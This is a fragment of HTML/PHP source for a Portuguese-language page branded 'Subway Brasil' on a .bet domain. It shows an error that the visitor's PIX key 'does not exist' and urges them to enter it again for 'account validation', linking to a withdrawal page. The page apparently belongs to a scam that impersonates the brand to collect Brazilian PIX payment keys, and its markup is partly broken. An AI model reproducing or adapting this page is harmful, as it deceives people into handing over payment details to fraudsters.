...
<head>
    ...
    <meta charset="pt-br">
    <title>Erro Computador - Subway Brasil </title>
...
<?php
    ...
    background-color: #af0303 !important;
            ...
            <div class="minting-container w-container" style="margin-top: -20%">
                ...
                <a style="color: red;"><h2>ERRO!</a> <br>ESSA CHAVE PIX NÃO EXISTE!</br> </h2>
                <p ><strong>Tente colocar uma nova chave pix para prosseguirmos com a validação da sua conta. Clique no botão abaixo para digitar a Chave PIX novamente.
                    </strong>
                </p>
                <strong style="margin-top: 20px">👇 Clique no Botão Abaixo 👇️️️</strong>

                <a href="https://subwaybrasil.bet/confirmar-chave-pix/saque.php" class="cadastro-btn">TENTAR NOVAMENTE</a>
